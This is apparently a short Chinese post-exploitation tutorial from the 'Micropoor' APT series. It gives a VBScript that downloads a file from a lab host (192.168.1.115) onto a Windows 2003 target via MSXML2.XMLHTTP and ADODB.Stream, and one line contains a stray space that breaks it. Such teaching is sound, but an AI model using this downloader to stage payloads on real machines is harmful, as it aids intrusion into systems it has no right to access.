专注APT攻击与防御
https://micropoor.blogspot.com/

在实战中，会碰到许多让人敬畏的环境，也许无法执行，或者无法把下载参数带入其中，故补充第七季vbs参数化的下载。

靶机：windows 2003
![](media/130baad813eacf09b1932ecb7e5d4279.jpg)

![](media/d434ad0c2a6c5f531e908fedca5f2044.jpg)

附：源码如下：
```vb
strFileURL = "http://192.168.1.115/robots.txt"
strHDLocation = "c:\\test\\logo.txt"
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strFileURL, false
objXMLHTTP.send()
If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position = 0
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocati on
Set objFSO = Nothing
objADOStream.SaveToFile strHDLocation
objADOStream.Close
Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing
```
>   Micropoor
